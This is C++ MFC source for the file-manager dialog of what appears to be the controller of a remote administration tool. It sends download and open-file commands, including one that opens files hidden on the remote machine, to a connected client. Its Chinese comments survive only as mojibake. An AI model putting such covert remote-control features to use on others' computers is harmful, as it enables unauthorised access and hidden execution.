	EnableControl(FALSE);
	
	if (m_nDropIndex != -1 && m_pDropList->GetItemData(m_nDropIndex))
		m_hCopyDestFolder = m_pDropList->GetItemText(m_nDropIndex, 0);
	
	m_Remote_Download_Job.RemoveAll();   //����  t 2.tx1.tx
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	//�õ�Զ���ļ���
	while(pos)   //  
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// �����Ŀ¼
		if (m_list_remote.GetItemData(nItem))
			file += '\\';
		// ��ӵ����������б���ȥ
		m_Remote_Download_Job.AddTail(file);
	} 
	//���͵�һ������
	SendDownloadJob();
}

BOOL CFileManagerDlg::SendDownloadJob()
{

	if (m_Remote_Download_Job.IsEmpty())
		return FALSE;

	// ������һ����������
	CString file = m_Remote_Download_Job.GetHead();
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
	bPacket[0] = COMMAND_DOWN_FILES;

	memcpy(bPacket + 1, file.GetBuffer(0), file.GetLength() + 1);
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// �����������б���ɾ���Լ�
	m_Remote_Download_Job.RemoveHead();
	//�ڱ��ض�����COMMAND_DOWN_FILES
	return TRUE;
}



void CFileManagerDlg::OnRemoteOpenShow()																						//Զ��������ʾ     
{
	
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	BYTE	lpPacket[MAX_PATH+10];
	lpPacket[0] = COMMAND_OPEN_FILE_SHOW;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
}



void CFileManagerDlg::OnRemoteOpenHide()																						//Զ����������
{
	CString	str;
	str = m_Remote_Path + m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

	int		nPacketLength = str.GetLength() + 2;
	BYTE	lpPacket[MAX_PATH+10];
	lpPacket[0] = COMMAND_OPEN_FILE_HIDE;
	memcpy(lpPacket + 1, str.GetBuffer(0), nPacketLength - 1);
	m_iocpServer->Send(m_pContext, lpPacket, nPacketLength);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////������

void CFileManagerDlg::OnDelete()                                                                          //�˵�ɾ������
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnIdtLocalDelete();
	}
	else
	{
		OnIdtRemoteDelete();
	}		
}

void CFileManagerDlg::OnNewfolder()                                                                       //�˵����Ŀ¼����
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnIdtLocalNewfolder();
	}
	else
	{
		OnIdtRemoteNewfolder();  
	}
}



void CFileManagerDlg::OnRename()																	      //�˵�����������
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		m_list_local.EditLabel(m_list_local.GetSelectionMark());
	}
	else
	{
		m_list_remote.EditLabel(m_list_remote.GetSelectionMark());
	}	
}



void CFileManagerDlg::OnRefresh()																	      //�˵���ˢ�¹���
{
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		FixedLocalFileList(".");
	}
	else
	{
		GetRemoteFileList(".");
	}		
}


void CFileManagerDlg::OnTransfer()																		  //�˵��Ĵ��书��
{
	
	POINT pt;
	GetCursorPos(&pt);
	if (GetFocus()->m_hWnd == m_list_local.m_hWnd)
	{
		OnIdtLocalCopy();
	}
	else
	{
		OnIdtRemoteCopy();     
	}
}




   int	GetIconIndex(LPCTSTR lpFileName, DWORD dwFileAttributes)
{
	SHFILEINFO	sfi;
	if (dwFileAttributes == INVALID_FILE_ATTRIBUTES)
		dwFileAttributes = FILE_ATTRIBUTE_NORMAL;
	else
		dwFileAttributes |= FILE_ATTRIBUTE_NORMAL;

	SHGetFileInfo
		(
		lpFileName,
		dwFileAttributes, 
		&sfi,
		sizeof(SHFILEINFO), 
		SHGFI_SYSICONINDEX | SHGFI_USEFILEATTRIBUTES
		);

	return sfi.iIcon;
}


void CFileManagerDlg::SendException()
{
	BYTE	bBuff = COMMAND_EXCEPTION;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}

void CFileManagerDlg::EnableControl(BOOL bEnable)
{
	m_list_local.EnableWindow(bEnable);
	m_list_remote.EnableWindow(bEnable);
	m_Local_Directory_ComboBox.EnableWindow(bEnable);
	m_Remote_Directory_ComboBox.EnableWindow(bEnable);
}



void CFileManagerDlg::ShowProgress()     //yi   da   yi  iu  jhjdk  o  dkfjk  o  dfkj
{
	char	*lpDirection = NULL;
	if (m_bIsUpload)
		lpDirection = "�����ļ�";
	else
		lpDirection = "�����ļ�";


	if ((int)m_nCounter == -1)
	{
		m_nCounter = m_nOperatingFileLength;  //5      100 
	}



	//10  /2  /3
	int	progress = (float)(m_nCounter * 100) / m_nOperatingFileLength;     //�ļ��ܳ�
	m_ProgressCtrl->SetPos(progress);

	if (m_nCounter == m_nOperatingFileLength)
	{
		m_nCounter = m_nOperatingFileLength = 0;
		// �ر��ļ����
	}
}








//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////�ļ�������ק

void CFileManagerDlg::OnLvnBegindragListLocal(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;
	m_nDragIndex = pNMListView->iItem;   //����Ҫ�ϵ���

	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;

	

	if(m_list_local.GetSelectedCount() > 1) //�任������ʽ  ���ѡ����������ק
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor); 
	

	
	m_bDragging = TRUE;	
	m_nDropIndex = -1;	
	m_pDragList = &m_list_local; 
	m_pDropWnd = &m_list_local;	

	SetCapture();   //���������Ϣ
	*pResult = 0;
}


void CFileManagerDlg::OnLvnBegindragListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMLISTVIEW pNMLV = reinterpret_cast<LPNMLISTVIEW>(pNMHDR);
	NM_LISTVIEW* pNMListView = (NM_LISTVIEW*)pNMHDR;

	m_nDragIndex = pNMListView->iItem;
	if (!m_list_local.GetItemText(m_nDragIndex, 0).Compare(".."))
		return;	


	

	if(m_list_remote.GetSelectedCount() > 1)
		m_hCursor = AfxGetApp()->LoadCursor(IDC_MUTI_DRAG);
	else
		m_hCursor = AfxGetApp()->LoadCursor(IDC_DRAG);

	ASSERT(m_hCursor); 
	
	
	m_bDragging = TRUE;	
	m_nDropIndex = -1;	
	m_pDragList = &m_list_remote;     //ȡ
	m_pDropWnd = &m_list_remote;
	SetCapture ();

	*pResult = 0;
}


void CFileManagerDlg::OnMouseMove(UINT nFlags, CPoint point)    //  ListCtrl   +   
{
	
	if (m_bDragging)    //����ֻ����ק����Ȥ  
	{	
		
		CPoint pt(point);	
		ClientToScreen(&pt);   //��Ļ

		
		//��������ô��ھ��
		CWnd* pDropWnd = WindowFromPoint (pt);   //��Ļ  λ�� �� ���ھ��

		ASSERT(pDropWnd);
		
		m_pDropWnd = pDropWnd;   //�� 

	
		if(pDropWnd->IsKindOf(RUNTIME_CLASS (CListCtrl)))   //�������ǵĴ��ڷ�Χ��
		{			

			SetCursor(m_hCursor);  //����

		//	if (m_pDropWnd->m_hWnd == m_pDragList->m_hWnd)   //�������Լ��Ĵ����о��˳�
		//		return;
		}
		else
		{
			
			SetCursor(LoadCursor(NULL, IDC_NO));   //�������ڻ������ʽ
		}
	}	
	CDialog::OnMouseMove(nFlags, point);
}


void CFileManagerDlg::OnLButtonUp(UINT nFlags, CPoint point)    //   ben  mu 
{
	if (m_bDragging)
	{
	
		ReleaseCapture();  //�ͷ����Ĳ���

		
		m_bDragging = FALSE;

		CPoint pt (point);    //��õ�ǰ����λ�������������Ļ��
		ClientToScreen (&pt); //ת��������ڵ�ǰ�û��Ĵ��ڵ�λ��    //kong zhuang  biang    20

		//ScreenToClient()
		
		CWnd* pDropWnd = WindowFromPoint (pt);   //��õ�ǰ������·����޿ؼ�  SeverList        ClientList   BeginDrag   
		ASSERT (pDropWnd);
	


		if (pDropWnd->IsKindOf (RUNTIME_CLASS (CListCtrl))) //�����һ��ListControl
		{
			m_pDropList = (CListCtrl*)pDropWnd;       //���浱ǰ�Ĵ��ھ��
			
			
			
			DropItemOnList(m_pDragList, m_pDropList); //������
		}
	}	
	CDialog::OnLButtonUp(nFlags, point);
}



void CFileManagerDlg::DropItemOnList(CListCtrl* pDragList, CListCtrl* pDropList)   
{


	if(pDragList == pDropList)    //������Լ��˳�
	{
		return;
	} 

	if ((CWnd *)pDropList == &m_list_local)
	{
		OnIdtRemoteCopy();      //�򱾵ؿ���
	}
	else if ((CWnd *)pDropList == &m_list_remote)
	{
		OnIdtLocalCopy();      //��Զ�̿���
	}
	else
	{
		return;
	}
	// ����
	m_nDropIndex = -1;
}




void CFileManagerDlg::OnCbnSelchangeRemotePath()
{
	// TODO: �ڴ���ӿؼ�֪ͨ����������

	GetRemoteFileList();
}
